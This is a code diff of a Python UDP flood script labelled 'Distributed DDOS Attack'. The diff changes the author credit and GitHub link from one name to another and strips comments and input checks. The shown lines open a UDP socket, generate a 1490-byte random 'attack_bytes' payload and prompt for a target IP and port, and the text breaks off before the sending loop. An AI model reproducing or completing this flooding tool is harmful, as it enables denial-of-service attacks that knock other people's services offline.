@@ -5,20 +5,20 @@ import sys
 import time
 from datetime import datetime
 
-# Initialize operating system environment for ANSI color codes
-if platform.system() == "Windows":
-    os.system("")
 
-# Capture utility instantiation timestamp
-execution_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
-# Initialize networking socket object (UDP Protocol)
+##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+attack_bytes = bytearray(random.getrandbits(8) for _ in range(1490))
+#############
 
-# Highly optimized data payload generation matching MTU bounds
-attack_bytes = os.urandom(1490)
-
-# Defined terminal interface styling pallet
 AMARILLO = "\033[93m"
 BLANCO = "\033[97m"
 CYAN = "\033[96m"
@@ -26,6 +26,15 @@ VERDE = "\033[92m"
 ROJO = "\033[91m"
 MAGENTA = "\033[95m"
 RESET = "\033[0m"
+
+def title():
+    print(VERDE + banner + RESET)
+    print(VERDE + "Distributed DDOS Attack -By Emensta" + RESET)
+    print(VERDE + "-" * 67 + RESET)
+    print("Author : Emensta")
+    print("Github : https://github.com/EmenstaNougat")
+    print(VERDE + "-" * 67 + RESET)
+
 
 banner = """
 ██████╗ ██████╗  ██████╗ ███████╗
@@ -36,30 +45,15 @@ banner = """
 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ 
 """
 
-def display_header():
-    """Renders the main tool information panel."""
-    print(VERDE + banner + RESET)
-    print(VERDE + f"Distributed DDOS Attack - By Rhuebarbs | {execution_time}" + RESET)
-    print(VERDE + "-" * 67 + RESET)
-    print("Author : Rhuebarbs")
-    print("Github : https://github.com/Dynjee")
-    print(VERDE + "-" * 67 + RESET)
+os.system("clear")
+title()
 
-# Initial environment flush and configuration load
-os.system("clear" if os.name == "posix" else "cls")
-display_header()
+ip = input(VERDE + "IP Target / Domain : " + RESET)
+port = int(input(VERDE + "Port               : " + RESET))
 
-# Collect targeted destination metrics
-target_ip = input(VERDE + "IP Target / Domain : " + RESET)
-try:
-    target_port = int(input(VERDE + "Port               : " + RESET))
-except ValueError:
-    print(ROJO + "\n[-] Fatal Error: Port entry must be a numeric integer value." + RESET)
-    sys.exit(1)
-
-# Transition screen rendering
-os.system("clear" if os.name == "posix" else "cls")
+os.system("clear")
 print(VERDE + """
+
     ___   __  __             __      _____ __             __           __   __
    /   | / /_/ /_____ ______/ /__   / ___// /_____ ______/ /____  ____/ /  / /
   / /| |/ __/ __/ __ `/ ___/ //_/   \__ \/ __/ __ `/ ___/ __/ _ \/ __  /  / / 
